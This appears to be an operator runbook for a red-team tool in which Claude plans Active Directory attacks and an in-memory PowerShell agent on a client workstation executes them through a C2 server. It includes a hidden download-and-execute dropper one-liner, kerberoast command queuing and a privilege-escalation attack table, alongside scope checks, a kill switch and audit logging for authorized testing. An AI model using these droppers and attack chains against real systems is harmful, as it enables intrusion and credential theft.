# TAR Internal Red Team Agent — Operator Runbook

The Internal Agent mode turns a single PowerShell one-liner on an authorized
client workstation into a full Claude-driven red team engagement. The OCD AD
mindmap is the methodology driver; Claude is the planning brain; the workstation
script is the executor.

---

## Architecture summary

```
Operator (Claude Code)                  Client workstation
      │                                       │
      │  queue command                        │  dropper.ps1 (once)
      ▼                                       ▼
 ┌──────────────┐  register/heartbeat  ┌──────────────┐
 │  tar_server  │◄─────────────────────│  agent.ps1   │
 │  (FastAPI)   │─────────────────────►│  (in-memory) │
 └──────────────┘   command + result   └──────────────┘
      │
      │  world model updates
      ▼
 ┌──────────────┐
 │ Claude Code  │  action_ranker → access-gated mindmap → next action
 │ (operator)   │
 └──────────────┘
```

**Claude makes every judgment call** — what to run next, when to pivot, when to
stop. The workstation agent executes what Claude queues; it never decides on its
own.

---

## Pre-engagement setup

### 1. Create a scope file

```yaml
# /home/kali/engagements/<id>/scope.yml
engagement_type: internal-agent
engagement_id: ACME-2026-Q2
scope:
  domain: corp.acme.local
  subnets:
    - 10.10.0.0/16
    - 192.168.5.0/24
  hostname_pattern: 'ACME-WKS-\d+'
  excluded_hosts:
    - ACME-WKS-042          # staging box — out of scope
    - ACME-DC-01            # DC — read-only; no lateral movement
  expiry: 2026-06-01T23:59:59Z
engagement_letter:
  path: /home/kali/engagements/ACME-2026-Q2/letter.pdf
  sha256: <sha256 of signed engagement letter PDF>
allow_destructive: false
```

### 2. Hash the engagement letter

```bash
sha256sum /home/kali/engagements/<id>/letter.pdf
```

### 3. Start the TAR server

```bash
cd /home/kali/Desktop/tar-repo
pip install -r server/requirements.txt
OPERATOR_API_KEY=<your-key> uvicorn server.tar_server:app --host 0.0.0.0 --port 8443 \
  --ssl-keyfile certs/server.key --ssl-certfile certs/server.crt
```

Get the server cert's SHA-256 thumbprint:
```bash
openssl x509 -in certs/server.crt -fingerprint -sha256 -noout | sed 's/://g' | cut -d= -f2
```

### 4. Create the engagement record

```bash
curl -sk -X POST https://tar.lab.local:8443/api/v1/engagement \
  -H "Authorization: Bearer <OPERATOR_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "engagement_id": "ACME-2026-Q2",
    "domain": "corp.acme.local",
    "subnets": ["10.10.0.0/16"],
    "hostname_pattern": "ACME-WKS-\\d+",
    "expiry_utc": "2026-06-01T23:59:59Z",
    "letter_sha256": "<from step 2>",
    "allow_destructive": false
  }'
```

---

## Deploying the dropper

Deliver this one-liner to the authorized workstation (paste into an existing
PowerShell session, or run via your initial access method):

```powershell
powershell -nop -w hidden -ep bypass -c "
  iex ((New-Object Net.WebClient).DownloadString(
    'https://tar.lab.local:8443/d/ACME-2026-Q2'))
"
```

The server's `/d/<engagement_id>` endpoint returns a pre-parameterized dropper
with `ServerCertSha256` and `EngagementLetterSha256` already baked in.

Or invoke manually if you already have a PowerShell shell:

```powershell
.\dropper.ps1 `
  -EngagementId      "ACME-2026-Q2" `
  -ServerUrl         "https://tar.lab.local:8443" `
  -ServerCertSha256  "<thumbprint-no-colons>" `
  -EngagementLetterSha256 "<sha256-of-letter>"
```

### What the dropper does

1. Pins the server TLS cert (SHA-256 thumbprint) — blocks friendly-blue-team MITM.
2. Detects current access level: `network_only → valid_username → authenticated →
   local_admin → domain_admin`.
3. `POST /api/v1/register` — sends hostname, domain, user, OS version, access level,
   engagement letter hash. Server validates scope; returns `agent_id` + HMAC key.
4. Fetches `agent.ps1` body from the server, verifies HMAC-SHA256 before executing.
5. `Invoke-Expression` — agent runs in the current runspace. Nothing touches disk.

---

## Operating the engagement

### Checking agent status

```bash
# Via planner-context.sh (Claude Code hook — injected automatically)
cat /home/kali/current/notes/session_state.md | grep -A20 'internal-agent'
```

Or query the API directly:
```bash
curl -sk https://tar.lab.local:8443/api/v1/engagement/ACME-2026-Q2 \
  -H "Authorization: Bearer <key>"
```

### Queuing a command (Claude Code → operator → server)

Claude Code generates ranked actions via `planner-context.sh`. The operator
reviews and approves. Then:

```bash
curl -sk -X POST https://tar.lab.local:8443/api/v1/command \
  -H "Authorization: Bearer <OPERATOR_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "engagement_id":  "ACME-2026-Q2",
    "agent_id":       "<agent_id>",
    "action_name":    "kerberoast",
    "exec_mode":      "sharpcollection",
    "command_body":   "<ps1 from action_bridge>",
    "required_access_level": "authenticated"
  }'
```

`action_bridge.py translate` generates the ready-to-queue command block:

```bash
python3 scripts/action_bridge.py translate kerberoast
```

### Access-level gating

The mindmap branches are gated by the current access level detected by the
dropper. Claude's ranker only surfaces actions reachable at the current level.

| Access level | Rank | What unlocks |
|---|---|---|
| `network_only` | 0 | Scan/enum, MITM setup, responder, hash crack |
| `valid_username` | 1 | Username spray, AS-REP roast, user enum |
| `authenticated` | 2 | Kerberoast, ADCS enum, LDAP enum, BloodHound, ACL abuse |
| `local_admin` | 3 | Lateral movement, LAPS read, credential dump, persistence |
| `domain_admin` | 4 | DCSync, GPO abuse, trust attacks, skeleton key |
| `enterprise_admin` | 5 | Cross-forest, schema abuse |

When the agent reports back a result that proves privilege escalation (e.g.
kerberoast returns a cracked DA hash), Claude updates the world model and the
ranker unlocks the next access tier's actions.

---

## Kill switch

Kill a specific agent immediately:
```bash
curl -sk -X POST https://tar.lab.local:8443/api/v1/kill/<agent_id> \
  -H "Authorization: Bearer <OPERATOR_API_KEY>"
```

The server sends a signed kill token. The agent validates the HMAC signature,
wipes `$Global:TarConfig` and `SharpBlobs`, and exits within one heartbeat
cycle (≤60 s by default).

---

## Audit log

Every command queued, every result received, and every scope rejection is
written to the engagement's SQLite database before the action is taken.

```bash
python3 -c "
import sqlite3, json
con = sqlite3.connect('/home/kali/engagements/ACME-2026-Q2/world_model.db')
for row in con.execute('SELECT ts, event, detail FROM audit_log ORDER BY ts'):
    print(row[0], row[1], row[2][:80])
"
```

Or export via API:
```bash
curl -sk https://tar.lab.local:8443/api/v1/audit/ACME-2026-Q2 \
  -H "Authorization: Bearer <key>" > audit.json
```

---

## Safety model

Three independent checks — all must pass before a command executes.

| Layer | Check | Failure action |
|---|---|---|
| Dropper-time | Scope pattern + engagement letter hash | Exit 2 (OUT_OF_SCOPE) |
| Agent-side | Hostname/domain/subnet/expiry/destructive/access-level | Result posted with SCOPE_BLOCKED |
| Server-side | Operator auth + scope validation + audit log | HTTP 403, audit entry written |

If any layer fails, the command never executes and the rejection is logged.

---

## Troubleshooting

**Agent doesn't register** — check VPN routing, server cert thumbprint, and that
`/api/v1/engagement` was created with the correct `engagement_id`.

**Scope blocked** — hostname pattern or subnet mismatch. Check the scope.yml
`hostname_pattern` regex against `$env:COMPUTERNAME`.

**HMAC verification failed** — TLS cert mismatch (MITM) or agent body corruption.
Regenerate the server cert and update `ServerCertSha256` in the dropper.

**Access level shows `network_only` on a domain machine** — DNS resolves
`USERDNSDOMAIN` but domain queries fail. Check that the workstation has line-of-
sight to a DC on port 389.

**BloodHound / Rubeus not loading** — sharpcollection actions require the binary
to be pre-loaded into `$Global:SharpBlobs` before the action is dispatched.
Use the `load_binary` server command to push the base64-encoded binary first.
